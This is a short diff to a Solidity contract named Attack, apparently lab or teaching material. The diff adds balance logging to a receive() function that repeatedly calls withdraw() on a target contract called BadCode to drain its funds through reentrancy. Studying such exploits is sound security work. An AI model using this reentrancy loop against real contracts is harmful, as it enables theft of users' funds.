@@ -13,6 +13,7 @@ interface BadCode {
 contract Attack {
     address public owner; 
     BadCode public _BadCode; 
+    event logBalance (uint balance); 
 
     /** 
     * @dev Called at the time of deployment. 
@@ -34,8 +35,9 @@ contract Attack {
     */
     receive () external payable {
 
-        // a loop to withdraw all
-        // not using (>=) to leave gas for the last round 
+        // a loop to withdraw all funds
+        emit logBalance(getBalance());
+        // not using (>=) to leave gas for the last round
         if(address(_BadCode).balance > 1) {
             _BadCode.withdraw(); 
         }
